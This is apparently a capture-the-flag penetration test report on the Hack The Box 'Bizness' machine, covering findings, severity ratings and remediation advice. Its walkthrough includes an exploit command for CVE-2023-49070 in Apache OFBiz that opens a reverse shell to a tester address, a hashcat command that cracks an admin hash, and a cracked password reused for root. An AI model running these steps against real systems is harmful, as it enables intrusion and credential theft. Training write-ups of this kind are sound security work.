Executive Summary

The below described penetration test has been conducted as part of a "capture the flag" training exercise, assessing the security of internet asset, provided by Hack The Box and documenting the findings in clear and repeatable manner. This document aims to also provide remediation recommendations.

Approach

The below described exercise was performed on 21st of April 2025 under a "black box" approach without any credentials or any advance knowledge of the target's structure or environment, besides that the system is running a Linux operational system. Testing was performed with the aim of securing a shell to the system and capturing the user and the root user's flags. The testing was performed remotely. Weaknesses leading to exploitation and capturing the flag are documented and manually investigated to show exploitation potential.

Scope

The scope of this assessment is the Bizness machine, provisioned by Hack The Box.

Host / URL / IP Address Description
bizness.htb / 10.10.11.252 Hack The Box testing machine

Assessment overview and recommendations

During the capture the flag exercise, the tester found five (5) security findings, which threaten the confidentiality, integrity and security of the tested machine. These findings were categorised by severity level as two (2) critical severity, one (1) high severity, one (1) medium severity and one (1) low severity.

The first critical severity finding comprised of a Remote Code Execution vulnerability in Apache OFBiz, which allowed the tester to execute code on the machine remotely.

The second critical severity finding comprised of weak password hashing implementation, which allowed the tester to crack administrative credentials.

The high severity finding comprised of Password re-use, allowing the tester to obtain administrative access through re-used passwords.

The medium severity finding comprised of the use of weak cryptographic hashing algorithms that are vulnerable to brute force attacks.

The low severity finding comprised of deprecated TLS versions (TLS 1.0 and 1.1) being enabled on the web server.

Internal Network Compromise Walkthrough

During the course of the exercise, the tester was able to gain foothold through Remote Code Execution vulnerability in Apache OFBiz, which led to reverse shell access to the tested machine. Further enumeration enabled the tester to obtain password hash for administrative user and crack it using brute force attacks. Password re-use allowed the tester to obtain full administrative access to the machine.

The steps below illustrate the path from initial foothold to full control and do not include all of the vulnerabilities and misconfigurations discovered during the course of testing. Issues discovered, and not part of the path to compromise are listed in the Technical Findings Details section of this report, ranked by severity level.

Detailed Walkthrough

The tester performed the following to fully compromise the Bizness machine:

  1. Using CVE-2023-49070 vulnerability in Apache OFBiz, the tester was able to obtain reverse shell from the machine
  2. Enumeration allowed the tester to discover Apache OFBiz Derby database containing password hashes
  3. Analysis of the password hashing implementation revealed weak SHA-1 hashing with short salt
  4. The tester was able to crack the administrative password using hashcat
  5. Password re-use allowed the tester to obtain root access to the machine

Detailed reproduction of the steps above:

The website running on the machine was found to be running Apache OFBiz Release 18.12, which is vulnerable to CVE-2023-49070.

Initial reconnaissance revealed:

  • Port 22: SSH OpenSSH_8.4p1 Debian-5+deb11u3
  • Port 80: HTTP (redirects to HTTPS)
  • Port 443: HTTPS nginx/1.18.0
  • Port 45157: Unknown service

The tester identified the target was running Apache OFBiz by accessing the login portal at https://bizness.htb/catalog/control/main.

Exploitation:
Using the CVE-2023-49070 exploit, the tester executed a payload that established a reverse shell connection:

python ofbiz_exploit.py https://bizness.htb shell 10.10.14.11:4444

The exploit was successful and provided shell access as the ofbiz user.

Enumeration and Privilege Escalation:
Once inside the system, the tester discovered the Apache OFBiz Derby database located at /opt/ofbiz/runtime/data/derby/. The database was transferred to the attacker machine for analysis.

Database analysis revealed the administrative user credentials:

  • Username: admin
  • Password Hash: $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I

Hash Analysis:
The tester analyzed the OFBiz password hashing implementation in HashCrypt.java and discovered:

  • Algorithm: SHA-1
  • Salt: d (single character)
  • Format: Base64URL-safe encoding

Password Cracking:
The hash was converted to standard format and cracked using hashcat:

hashcat -m 120 -a 0 hash /usr/share/wordlists/rockyou.txt

Result: monkeybizness

Root Access:
The cracked password was reused for the root account, allowing full system compromise:

su root
Password: monkeybizness

The tester successfully obtained root access and retrieved both user and root flags.

Remediation Summary

The assessment has uncovered several opportunities for strengthening the security of the machine. Remediation efforts are prioritized below, starting from those, likely to take least amount of time and effort to complete.

Short term

  • Update Apache OFBiz to the latest version to patch CVE-2023-49070
  • Implement strong password policies preventing password reuse
  • Replace weak SHA-1 hashing with modern algorithms (bcrypt, scrypt, or Argon2)
  • Increase salt complexity and uniqueness
  • Disable deprecated TLS versions (1.0 and 1.1)

Medium term

  • Implement multi-factor authentication for administrative accounts
  • Regular security updates and vulnerability assessments
  • Network segmentation and access controls

Long term

  • Perform ongoing vulnerability assessments and password audits
  • Educate users to develop strong password habits
  • Implement comprehensive security monitoring and logging

Technical Finding Details

1. Apache OFBiz Remote Code Execution (CVE-2023-49070) - Critical

CWECVE-2023-49070
CVSS 3.1 Score9.8
DescriptionThe tester was able to execute code on the tested machine remotely without authorization using a known vulnerability in Apache OFBiz Release 18.12.
Security ImpactAn unauthorised actor can execute arbitrary code on the server, leading to full system compromise.
Affected domainbizness.htb
Remediation- Update Apache OFBiz to the latest patched version
- Implement network segmentation
- Apply security patches promptly
External References- https://nvd.nist.gov/vuln/detail/CVE-2023-49070

Finding evidence:
The tester successfully exploited CVE-2023-49070 to gain remote code execution and establish a reverse shell connection to the target machine.

2. Weak Password Hashing Implementation - Critical

CWECWE-327
CVSS 3.1 Score9.1
DescriptionThe system uses weak SHA-1 hashing with minimal salt, making password hashes vulnerable to brute force attacks.
Security ImpactAttackers can easily crack password hashes, leading to credential compromise and unauthorized access.
Affected domainbizness.htb
Remediation- Implement strong password hashing algorithms (bcrypt, scrypt, Argon2)
- Use cryptographically secure random salts
- Increase computational cost of hashing
External References- https://cwe.mitre.org/data/definitions/327.html

Finding evidence:
The administrative password hash $SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I was easily cracked using hashcat, revealing the password "monkeybizness".

3. Password Re-use - High

CWECWE-521
CVSS 3.1 Score8.8
DescriptionThe same password was reused across multiple accounts (admin application user and system root user).
Security ImpactIf one account is compromised, attackers can access other accounts with the same credentials, leading to broader system breaches.
Affected domainbizness.htb
Remediation- Implement unique, strong passwords for each account
- Employ password managers and enforce password policies
- Implement multi-factor authentication
External References- https://cwe.mitre.org/data/definitions/521.html

Finding evidence:
The cracked administrative password "monkeybizness" was successfully reused to gain root access to the system.

4. Weak Cryptographic Hashing Algorithms - Medium

CWECWE-328
CVSS 3.1 Score5.5
DescriptionThe system uses SHA-1 hashing algorithm which is considered cryptographically weak and vulnerable to collision attacks.
Security ImpactWeak hashing algorithms can be exploited to compromise data integrity and authentication mechanisms.
Affected domainbizness.htb
Remediation- Migrate to stronger hashing algorithms (SHA-256 minimum)
- Implement proper password hashing with salt and iterations
External References- https://cwe.mitre.org/data/definitions/328.html

Finding evidence:
Analysis of the password hashing implementation revealed the use of deprecated SHA-1 algorithm with minimal salt complexity.

5. Deprecated TLS Versions Enabled - Low

CWECWE-326
CVSS 3.1 Score3.7
DescriptionThe web server supports deprecated TLS versions 1.0 and 1.1 which have known security vulnerabilities.
Security ImpactUse of deprecated TLS versions may allow attackers to exploit known protocol weaknesses.
Affected domainbizness.htb
Remediation- Disable TLS 1.0 and 1.1
- Configure server to use TLS 1.2 and 1.3 only
- Implement strong cipher suites
External References- https://cwe.mitre.org/data/definitions/326.html

Finding evidence:
SSL scan revealed that the server accepts connections using deprecated TLS 1.0 and TLS 1.1 protocols.

Appendix A – Finding Severities

Rating Definition
Critical Represents the most serious vulnerabilities, often with a CVSS score of 9.0 or higher. These vulnerabilities can lead to significant data breaches, system compromise, or complete loss of functionality.
High High severity vulnerabilities, with CVSS scores typically ranging from 7.0 to 8.9, can also pose a significant risk to confidentiality, integrity, or availability. Exploitation could lead to substantial damage.
Medium Medium severity vulnerabilities (CVSS scores 4.0 to 6.9) are less likely to result in severe consequences but can still be exploited to access sensitive data or disrupt operations.
Low Low severity vulnerabilities (CVSS scores 1.0 to 3.9) pose minimal risk, often requiring specific conditions or privileges to exploit. They might not directly lead to significant damage but could be a building block for more severe attacks.
Informational/None These levels are often used for findings that do not represent a security vulnerability but are still important for security awareness or potential future vulnerabilities.
